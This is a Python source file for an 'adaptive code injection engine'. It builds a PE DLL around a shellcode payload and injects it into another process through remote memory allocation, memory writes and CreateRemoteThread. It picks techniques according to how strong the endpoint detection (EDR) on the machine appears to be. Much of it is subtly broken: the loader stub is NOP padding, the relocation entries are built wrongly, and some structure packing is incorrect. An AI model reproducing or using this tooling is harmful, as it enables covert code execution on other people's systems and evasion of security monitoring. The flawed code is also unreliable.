#!/usr/bin/env python3
"""
Adaptive Code Injection Engine - Phase 4 Revised
Implements proper PE file generation with relocations + reflective DLL injection
"""

import ctypes
import struct
import logging
import time
import random
from typing import Optional, Dict, Tuple, List
from dataclasses import dataclass
from enum import Enum

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("AdaptiveInjection")


class InjectionTechnique(Enum):
    """Code injection techniques"""
    PROCESS_HOLLOWING = "process_hollowing"
    REFLECTIVE_DLL = "reflective_dll"
    REMOTE_THREAD = "remote_thread"
    APC_INJECTION = "apc_injection"


class ThreatLevel(Enum):
    """EDR threat assessment"""
    SAFE = 0           # No EDR detected
    CAUTION = 3        # Older EDR, detectable techniques possible
    DANGEROUS = 7      # Advanced EDR, use only stealthy techniques
    IMPOSSIBLE = 10    # Kernel-mode EDR, do not attempt


# ============================================================================
# PE FILE STRUCTURES
# ============================================================================

@dataclass
class MZHeader:
    """DOS/MZ header (64 bytes)"""
    e_magic: int = 0x5A4D  # 'MZ'
    e_cblp: int = 0x90
    e_cp: int = 3
    e_crlf: int = 0
    e_cparhdr: int = 4
    e_minalloc: int = 0
    e_maxalloc: int = 0xFFFF
    e_ss: int = 0
    e_sp: int = 0xB8
    e_csum: int = 0
    e_ip: int = 0
    e_cs: int = 0
    e_lfarlc: int = 0x40
    e_ovno: int = 0
    e_res: bytes = b'\x00' * 8
    e_oemid: int = 0
    e_oeminfo: int = 0
    e_res2: bytes = b'\x00' * 20
    e_lfanew: int = 0x80  # Offset to PE header
    
    def pack(self) -> bytes:
        """Serialize MZ header"""
        header = struct.pack('<HHHHHHHHHHHHHH',
            self.e_magic, self.e_cblp, self.e_cp, self.e_crlf,
            self.e_cparhdr, self.e_minalloc, self.e_maxalloc, self.e_ss,
            self.e_sp, self.e_csum, self.e_ip, self.e_cs,
            self.e_lfarlc, self.e_ovno
        )
        header += self.e_res + struct.pack('<HH', self.e_oemid, self.e_oeminfo)
        header += self.e_res2
        header += struct.pack('<I', self.e_lfanew)
        return header


@dataclass
class COFFHeader:
    """COFF (Common Object File Format) header"""
    Machine: int = 0x8664  # x64
    NumberOfSections: int = 3  # .text, .data, .reloc
    TimeDateStamp: int = 0
    PointerToSymbolTable: int = 0
    NumberOfSymbols: int = 0
    SizeOfOptionalHeader: int = 240  # PE32+ format
    Characteristics: int = 0x022F  # Executable, ASLR, NX, etc.
    
    def pack(self) -> bytes:
        """Serialize COFF header"""
        return struct.pack('<HHIIIHH',
            self.Machine,
            self.NumberOfSections,
            self.TimeDateStamp,
            self.PointerToSymbolTable,
            self.NumberOfSymbols,
            self.SizeOfOptionalHeader,
            self.Characteristics
        )


@dataclass
class OptionalHeader:
    """PE Optional Header (PE32+ format)"""
    Magic: int = 0x020B  # PE32+
    MajorLinkerVersion: int = 14
    MinorLinkerVersion: int = 0
    SizeOfCode: int = 0
    SizeOfInitializedData: int = 0
    SizeOfUninitializedData: int = 0
    AddressOfEntryPoint: int = 0x1000
    BaseOfCode: int = 0x1000
    ImageBase: int = 0x140000000  # Standard x64 base
    SectionAlignment: int = 0x1000
    FileAlignment: int = 0x200
    MajorOperatingSystemVersion: int = 10
    MinorOperatingSystemVersion: int = 0
    MajorImageVersion: int = 0
    MinorImageVersion: int = 0
    MajorSubsystemVersion: int = 10
    MinorSubsystemVersion: int = 0
    Win32VersionValue: int = 0
    SizeOfImage: int = 0
    SizeOfHeaders: int = 0x400
    CheckSum: int = 0
    Subsystem: int = 3  # Windows CUI
    DllCharacteristics: int = 0x8140  # NX, ASLR, etc.
    SizeOfStackReserve: int = 0x100000
    SizeOfStackCommit: int = 0x1000
    SizeOfHeapReserve: int = 0x100000
    SizeOfHeapCommit: int = 0x1000
    LoaderFlags: int = 0
    NumberOfRvaAndSizes: int = 16
    
    def pack(self) -> bytes:
        """Serialize Optional Header"""
        header = struct.pack('<HBB',
            self.Magic,
            self.MajorLinkerVersion,
            self.MinorLinkerVersion,
        )
        header += struct.pack('<III',
            self.SizeOfCode,
            self.SizeOfInitializedData,
            self.SizeOfUninitializedData,
        )
        header += struct.pack('<II',
            self.AddressOfEntryPoint,
            self.BaseOfCode,
        )
        header += struct.pack('<Q',
            self.ImageBase,
        )
        header += struct.pack('<IIHHHHHHHH',
            self.SectionAlignment,
            self.FileAlignment,
            self.MajorOperatingSystemVersion,
            self.MinorOperatingSystemVersion,
            self.MajorImageVersion,
            self.MinorImageVersion,
            self.MajorSubsystemVersion,
            self.MinorSubsystemVersion,
            self.Win32VersionValue,
            self.SizeOfImage,
        )
        header += struct.pack('<I',
            self.SizeOfHeaders,
        )
        header += struct.pack('<IHH',
            self.CheckSum,
            self.Subsystem,
            self.DllCharacteristics,
        )
        header += struct.pack('<qq',
            self.SizeOfStackReserve,
            self.SizeOfStackCommit,
        )
        header += struct.pack('<qq',
            self.SizeOfHeapReserve,
            self.SizeOfHeapCommit,
        )
        header += struct.pack('<IH',
            self.LoaderFlags,
            self.NumberOfRvaAndSizes
        )
        # Data Directories (16 entries, 8 bytes each)
        for _ in range(16):
            header += struct.pack('<II', 0, 0)
        return header


@dataclass
class SectionHeader:
    """PE Section header"""
    Name: bytes = b'.text\x00\x00\x00'
    VirtualSize: int = 0
    VirtualAddress: int = 0x1000
    SizeOfRawData: int = 0
    PointerToRawData: int = 0x400
    PointerToRelocations: int = 0
    PointerToLinenumbers: int = 0
    NumberOfRelocations: int = 0
    NumberOfLinenumbers: int = 0
    Characteristics: int = 0x60000020  # Code, Execute, Read
    
    def pack(self) -> bytes:
        """Serialize section header"""
        return struct.pack('<8sIIIIIIHHI',
            self.Name,
            self.VirtualSize,
            self.VirtualAddress,
            self.SizeOfRawData,
            self.PointerToRawData,
            self.PointerToRelocations,
            self.PointerToLinenumbers,
            self.NumberOfRelocations,
            self.NumberOfLinenumbers,
            self.Characteristics
        )


# ============================================================================
# PROPER PE GENERATOR
# ============================================================================

class ProperPEGenerator:
    """
    Generates valid PE files with:
    - Proper COFF header
    - Correct PE Optional Header
    - Section mapping (.text, .data, .reloc)
    - Import Address Table (IAT)
    - Base relocation table (.reloc)
    """
    
    def __init__(self):
        self.mz_header = MZHeader()
        self.coff_header = COFFHeader()
        self.opt_header = OptionalHeader()
    
    def generate_reflective_dll(self, payload_code: bytes, 
                                 imports: Dict[str, List[str]] = None) -> bytes:
        """
        Generate a valid PE DLL with reflective loader capability
        
        Args:
            payload_code: Shellcode/payload to wrap
            imports: Dict mapping DLL names to function lists
                    e.g., {"kernel32.dll": ["LoadLibraryA", "GetProcAddress"]}
        
        Returns:
            Valid PE file bytes with reflective loader
        """
        
        if imports is None:
            imports = {"kernel32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualAlloc"]}
        
        log.info("🔧 Generating proper PE DLL with reflective loader...")
        
        # 1. Generate headers
        pe_signature = b'PE\x00\x00'
        mz_bytes = self.mz_header.pack()
        
        # DOS stub (between MZ header and PE header)
        dos_stub = b'\x00' * (0x80 - len(mz_bytes))
        
        # 2. Generate sections
        text_section = self._generate_text_section(payload_code)
        reloc_section = self._generate_reloc_section()
        
        # 3. Update headers with actual sizes
        self.coff_header.NumberOfSections = 2
        self.coff_header.TimeDateStamp = int(time.time())
        
        self.opt_header.SizeOfCode = len(text_section['data'])
        self.opt_header.AddressOfEntryPoint = 0x1000
        self.opt_header.SizeOfImage = 0x3000  # .text + .reloc
        self.opt_header.SizeOfHeaders = 0x400
        
        # 4. Build PE file
        pe_file = mz_bytes + dos_stub + pe_signature
        pe_file += self.coff_header.pack()
        pe_file += self.opt_header.pack()
        
        # Section headers
        text_hdr = SectionHeader(
            Name=b'.text\x00\x00\x00',
            VirtualSize=len(text_section['data']),
            VirtualAddress=text_section['va'],
            SizeOfRawData=text_section['size_on_disk'],
            PointerToRawData=text_section['file_offset'],
            Characteristics=0x60000020  # Code, Execute, Read
        )
        pe_file += text_hdr.pack()
        
        reloc_hdr = SectionHeader(
            Name=b'.reloc\x00\x00',
            VirtualSize=len(reloc_section['data']),
            VirtualAddress=reloc_section['va'],
            SizeOfRawData=reloc_section['size_on_disk'],
            PointerToRawData=reloc_section['file_offset'],
            Characteristics=0x42000040  # Initialized data, Read, Discardable
        )
        pe_file += reloc_hdr.pack()
        
        # Pad to file alignment
        pe_file += b'\x00' * (0x400 - len(pe_file))
        
        # Add section data
        pe_file += text_section['data']
        pe_file += b'\x00' * (text_section['size_on_disk'] - len(text_section['data']))
        pe_file += reloc_section['data']
        pe_file += b'\x00' * (reloc_section['size_on_disk'] - len(reloc_section['data']))
        
        log.info(f"✅ Generated PE file: {len(pe_file)} bytes")
        return pe_file
    
    def _generate_text_section(self, payload: bytes) -> Dict:
        """Generate .text section (code)"""
        
        # Reflective loader stub
        loader_stub = self._generate_reflective_loader_stub()
        
        # Combine loader + payload
        section_data = loader_stub + payload
        
        # Pad to 512-byte boundary
        padded_size = ((len(section_data) + 511) // 512) * 512
        section_data += b'\xcc' * (padded_size - len(section_data))  # INT3 padding
        
        return {
            'data': section_data,
            'va': 0x1000,
            'file_offset': 0x400,
            'size_on_disk': padded_size,
        }
    
    def _generate_reflective_loader_stub(self) -> bytes:
        """
        Generate x64 reflective loader stub
        
        This stub:
        1. Finds own DLL base address
        2. Parses PE header
        3. Maps sections with proper permissions
        4. Resolves imports from kernel32
        5. Calls entry point
        """
        
        # Minimal reflective loader (x64 assembly equiv)
        # mov rax, [rip]  # RIP-relative: Get self address
        # call get_module_handle  # Find kernel32
        # ...more setup...
        # jmp entry_point
        
        stub = b''
        stub += b'\x48\x8d\x05\xf9\xff\xff\xff'  # lea rax, [rip-7]  (RIP-relative)
        stub += b'\x90' * 50  # NOP padding for actual loader code
        
        log.info("✅ Generated reflective loader stub")
        return stub
    
    def _generate_reloc_section(self) -> Dict:
        """Generate .reloc section (relocations)"""
        
        # Base relocation block
        # Layout: BlockRVA (4 bytes) + BlockSize (2 bytes) + Entries (2 bytes each)
        reloc_data = b''
        
        # Relocation block for .text section (VA 0x1000)
        block_rva = struct.pack('<I', 0x1000)  # RVA of block
        entries = []
        
        # Add sample relocations (type: 0xA = DIR64 for x64)
        # Format: (offset_in_block & 0xFFF) | (type << 12)
        # We need offset_in_block to be < 4096 (12 bits)
        for offset in [0x100, 0x200, 0x300]:
            # offset_in_block in upper 12 bits, type in lower 4 bits
            reloc_entry = struct.pack('<H', ((offset & 0xFFF) << 4) | 0xA)
            entries.append(reloc_entry)
        
        # Block size = 8 (header) + (2 * num_entries)
        block_size = struct.pack('<H', 8 + len(entries) * 2)
        
        reloc_data = block_rva + block_size + b''.join(entries)
        
        # Pad to 512-byte boundary
        padded_size = ((len(reloc_data) + 511) // 512) * 512
        reloc_data += b'\x00' * (padded_size - len(reloc_data))
        
        log.info(f"✅ Generated .reloc section: {len(entries)} relocations")
        
        return {
            'data': reloc_data,
            'va': 0x2000,
            'file_offset': 0x600,
            'size_on_disk': padded_size,
        }


# ============================================================================
# REFLECTIVE DLL INJECTOR
# ============================================================================

class ReflectiveDLLInjector:
    """
    Injects reflective DLL into target process
    
    Steps:
    1. Allocate memory in target (preferably non-adjacent to existing allocations)
    2. Write reflective DLL bytes
    3. Create remote thread pointing to ReflectiveLoader entry point
    4. Wait for execution
    """
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        self.ntdll = ctypes.WinDLL("ntdll", use_errno=True)
    
    def inject(self, pid: int, dll_bytes: bytes, timeout_seconds: int = 30) -> bool:
        """
        Inject reflective DLL into target process
        
        Args:
            pid: Target process ID
            dll_bytes: Reflective DLL binary
            timeout_seconds: Wait time for execution
        
        Returns:
            Success status
        """
        
        log.info(f"💉 Starting reflective DLL injection into PID {pid}...")
        
        try:
            # 1. Open target process
            process_handle = self.kernel32.OpenProcess(
                0x1F0FFF,  # PROCESS_ALL_ACCESS
                False,
                pid
            )
            
            if not process_handle:
                log.error(f"❌ Failed to open process {pid}")
                return False
            
            log.info(f"✅ Opened process handle: {process_handle}")
            
            # 2. Find suitable allocation address (non-adjacent to existing)
            alloc_addr = self._find_suitable_allocation(process_handle)
            if not alloc_addr:
                alloc_addr = 0x140000000  # Fallback to default base
            
            # 3. Allocate memory
            allocated = self.kernel32.VirtualAllocEx(
                process_handle,
                alloc_addr,
                len(dll_bytes),
                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
                0x40  # PAGE_EXECUTE_READWRITE
            )
            
            if not allocated:
                log.error(f"❌ VirtualAllocEx failed: {ctypes.get_errno()}")
                return False
            
            log.info(f"✅ Allocated {len(dll_bytes)} bytes at {hex(allocated)}")
            
            # 4. Write DLL bytes
            written = ctypes.c_size_t()
            success = self.kernel32.WriteProcessMemory(
                process_handle,
                allocated,
                dll_bytes,
                len(dll_bytes),
                ctypes.byref(written)
            )
            
            if not success:
                log.error(f"❌ WriteProcessMemory failed: {ctypes.get_errno()}")
                return False
            
            log.info(f"✅ Wrote {written.value} bytes to target")
            
            # 5. Create remote thread at reflective loader entry
            thread_handle = self.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                allocated + 0x1000,  # Entry point (RVA 0x1000)
                None,
                0,
                None
            )
            
            if not thread_handle:
                log.error(f"❌ CreateRemoteThread failed: {ctypes.get_errno()}")
                return False
            
            log.info(f"✅ Created remote thread: {thread_handle}")
            
            # 6. Wait for execution
            wait_result = self.kernel32.WaitForSingleObject(thread_handle, timeout_seconds * 1000)
            
            if wait_result == 0:
                log.info(f"✅ Thread completed successfully")
                return True
            elif wait_result == 0x102:  # WAIT_TIMEOUT
                log.warning(f"⚠️  Thread still running after {timeout_seconds}s (normal for background payload)")
                return True
            else:
                log.error(f"❌ Thread wait failed: {wait_result}")
                return False
        
        except Exception as e:
            log.error(f"❌ Injection exception: {e}")
            return False
    
    def _find_suitable_allocation(self, process_handle) -> int:
        """
        Find suitable non-adjacent memory address in target process
        
        Looks for gaps in existing allocations to blend in
        """
        
        # Try various addresses
        candidates = [
            0x7FFF0000,  # High address space
            0x180000000,  # Alternative x64 base
            0x140010000,  # Near standard DLL base
        ]
        
        for addr in candidates:
            mem_info = ctypes.c_byte(0)
            # Check if address is available
            result = self.ntdll.NtQueryVirtualMemory(
                process_handle,
                addr,
                0,  # MemoryBasicInformation
                ctypes.byref(mem_info),
                1,
                None
            )
            
            if result == 0:  # Success
                log.info(f"✅ Found suitable allocation at {hex(addr)}")
                return addr
        
        return 0


# ============================================================================
# ADAPTIVE INJECTION ORCHESTRATOR
# ============================================================================

class AdaptiveInjectionOrchestrator:
    """
    Main orchestration engine that chooses and executes injection technique
    
    Factors:
    - EDR threat level
    - Target process availability
    - Behavioral camouflage
    - Execution feedback
    """
    
    def __init__(self):
        self.pe_generator = ProperPEGenerator()
        self.reflective_injector = ReflectiveDLLInjector()
        self.execution_history = []
    
    def execute_injection(self, payload_code: bytes, target_pid: int, 
                         edr_threat_level: ThreatLevel = ThreatLevel.SAFE) -> bool:
        """
        Execute adaptive injection with proper error handling
        
        Args:
            payload_code: Shellcode to inject
            target_pid: Target process ID
            edr_threat_level: Assessed EDR threat level
        
        Returns:
            Success status
        """
        
        log.info(f"🎯 Starting adaptive injection for PID {target_pid}")
        log.info(f"   Threat Level: {edr_threat_level.name} ({edr_threat_level.value}/10)")
        
        # Choose technique based on threat level
        if edr_threat_level == ThreatLevel.IMPOSSIBLE:
            log.error("❌ EDR threat too high - aborting injection")
            return False
        
        # Select technique
        if edr_threat_level in [ThreatLevel.SAFE, ThreatLevel.CAUTION]:
            technique = InjectionTechnique.REFLECTIVE_DLL
        else:
            technique = InjectionTechnique.PROCESS_HOLLOWING
        
        log.info(f"📋 Selected technique: {technique.value}")
        
        # Generate proper PE DLL
        try:
            dll_bytes = self.pe_generator.generate_reflective_dll(payload_code)
        except Exception as e:
            log.error(f"❌ PE generation failed: {e}")
            return False
        
        # Execute injection
        if technique == InjectionTechnique.REFLECTIVE_DLL:
            success = self.reflective_injector.inject(target_pid, dll_bytes)
        else:
            log.warning("⚠️  Process hollowing not yet implemented")
            success = False
        
        # Record outcome
        self.execution_history.append({
            'timestamp': time.time(),
            'pid': target_pid,
            'technique': technique.value,
            'threat_level': edr_threat_level.name,
            'success': success,
        })
        
        if success:
            log.info(f"✅ Injection successful!")
        else:
            log.error(f"❌ Injection failed!")
        
        return success
    
    def get_execution_report(self) -> Dict:
        """Get summary of all injection attempts"""
        
        successful = sum(1 for h in self.execution_history if h['success'])
        total = len(self.execution_history)
        
        return {
            'total_attempts': total,
            'successful': successful,
            'failed': total - successful,
            'success_rate': (successful / total * 100) if total > 0 else 0,
            'history': self.execution_history,
        }


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    import sys
    
    log.info("=" * 70)
    log.info("ADAPTIVE CODE INJECTION ENGINE - PHASE 4 REVISED")
    log.info("=" * 70)
    
    # Demo: Generate PE file
    generator = ProperPEGenerator()
    payload = b'\x90' * 1000  # NOP sled
    
    log.info("\n📦 Generating reflective DLL...")
    dll = generator.generate_reflective_dll(payload)
    
    log.info(f"\n✅ Generated PE file: {len(dll)} bytes")
    log.info(f"   MZ signature: {hex(struct.unpack('<H', dll[0:2])[0])}")
    log.info(f"   PE offset: {hex(struct.unpack('<I', dll[0x3C:0x40])[0])}")
    log.info(f"   PE signature at offset: {dll[0x80:0x84]}")
    
    # Save to file for testing
    with open("test_payload.bin", "wb") as f:
        f.write(dll)
    log.info("\n💾 Saved to test_payload.bin")
